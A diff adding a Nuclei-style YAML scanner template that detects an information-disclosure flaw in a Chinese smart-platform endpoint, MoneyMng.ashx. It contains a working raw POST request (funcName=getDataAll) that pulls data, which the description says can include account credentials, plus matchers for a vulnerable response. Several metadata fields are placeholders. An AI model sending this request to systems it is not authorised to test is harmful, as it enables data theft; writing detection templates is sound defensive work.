@@ -1,0 +1,30 @@
+id: lay-MoneyMng-weak
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: d脸爱云一脸通智慧平台MoneyMng.ashx接口处存在信息泄露漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如账号密码等
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /MoneyMng.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 19
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        Accept: application/json, text/javascript, */*; q=0.01
+
+        funcName=getDataAll
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - getDay
